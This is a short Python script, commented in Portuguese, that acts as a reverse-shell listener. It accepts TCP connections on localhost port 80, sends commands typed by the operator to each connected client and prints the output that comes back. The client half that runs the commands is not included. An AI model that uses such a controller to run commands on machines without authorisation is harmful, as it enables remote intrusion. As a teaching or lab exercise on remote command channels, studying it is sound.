import socket

def main():
    #criando socket tcp 
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        server.bind(('localhost', 80)) 
        server.listen(10)
        print("Ouvindo: ...")
    except:
        return print('\n Não foi possível iniciar o servidor \n')

    while True:
        # aceita qualquer tentativa de conexão 
        client, client_address = server.accept() 
        print(f"{client_address[0]}:{client_address[1]} Connected!")

        #recebe as mensagens do servidor
        messages(client,server)

def messages(client, server):
    while True: 
        # obtém o comando do prompt 
        cmd = input("Digite o comando que você deseja executar: \n") 
        if cmd.lower() == "exit":
            # se o comando for exit, apenas saia do loop 
            break 

        # envia o comando para o cliente 
        client.send(cmd.encode()) 
        # recupera os resultados do comando 
        msg = client.recv(2048).decode() 
        print(msg) 

    client.close()

main()
